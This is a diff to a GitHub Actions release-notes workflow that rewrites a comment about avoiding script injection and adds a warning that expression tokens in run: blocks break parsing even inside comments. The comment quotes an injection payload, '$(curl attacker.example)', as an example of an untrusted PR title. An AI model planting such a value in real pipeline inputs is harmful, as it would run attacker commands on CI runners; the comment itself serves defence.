@@ -105,9 +105,17 @@ jobs:
           # Reads commit subjects from the git object database at run time
           # (this repo squash-merges every PR, so one subject == one PR
           # title) rather than interpolating any PR/commit text into this
-          # (or any) shell string via `${{ }}` -- avoids the known GitHub
-          # Actions script-injection pattern where an untrusted title like
-          # `$(curl attacker.example)` gets evaluated instead of printed.
+          # (or any) shell string via a GitHub Actions expression -- avoids
+          # the known GitHub Actions script-injection pattern where an
+          # untrusted title like `$(curl attacker.example)` gets evaluated
+          # instead of printed.
+          #
+          # NOTE: do not write a literal double-curly-brace expression
+          # token inside this (or any) run: block, even in a comment --
+          # GitHub Actions templates the entire run: string before bash
+          # ever sees it, so an empty/malformed one here fails the whole
+          # workflow to parse (this is exactly how an earlier version of
+          # this file broke on its first real run).
           {
             echo "## $TAG - $(date -u +%Y-%m-%d)"
             echo
